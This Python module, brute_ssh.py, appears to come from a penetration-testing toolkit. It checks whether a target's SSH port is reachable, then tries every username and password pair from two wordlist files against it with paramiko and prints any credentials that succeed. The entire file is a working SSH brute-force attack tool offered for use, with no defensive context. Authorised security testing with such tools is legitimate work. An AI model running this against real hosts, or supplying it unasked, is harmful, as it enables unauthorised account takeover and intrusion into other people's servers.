#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File : brute_ssh.py
# @Author : Norah C.IV
# @Time : 2022/4/21 10:37
# @Software: PyCharm
import socket
import paramiko
import itertools
import queue
import os

from prettytable import PrettyTable

root_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
table = PrettyTable()

table.field_names = ['\033[0;32mHost\033[0m', '\033[0;32mPort\033[0m', '\033[0;32mUsername\033[0m',
                     '\033[0;32mPassword\033[0m']


class ssh_brute:
    @staticmethod
    def check(hosts, ports):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect_ex((hosts, int(ports)))
        if connect == 0:
            return True
        else:
            s.close()
            return False

    @staticmethod
    def brute(hosts, ports):
        if not ssh_brute.check(hosts, ports):
            print('[-] {}:{} is unreachable'.format(hosts, ports))
        else:
            task_queue = queue.Queue()
            result_queue = queue.Queue()
            for username, password in ssh_brute.get_word_list():
                task_queue.put((hosts, ports, username.strip(), password.strip()))
            while not task_queue.empty():
                task_host, task_port, username, password = task_queue.get()
                if ssh_brute.ssh_login(task_host, task_port, username, password):
                    with task_queue.mutex:
                        task_queue.queue.clear()
                    result_queue.put((username, password))

            if not result_queue.empty():
                true_username, true_passwords = result_queue.get()
                table.add_row([hosts, ports, true_username, true_passwords])
            else:
                table.add_row([hosts, ports, '', ''])
            print(table)
            print("\033[0;31m[*] Enter '0' to Go Back or Other Type of Brute\033[0m")

    @classmethod
    def get_word_list(cls):
        with open(root_path + '/dicts/dic_username_ssh.txt') as username:
            with open(root_path + '/dicts/dic_password_ssh.txt') as password:
                return itertools.product(username, password)

    @classmethod
    def ssh_login(cls, task_host, task_port, username, password):
        ret = False
        ssh = None
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(task_host, task_port, username, password, timeout=6)
            ret = True
        except Exception:
            pass
        finally:
            if ssh:
                ssh.close()
        return ret
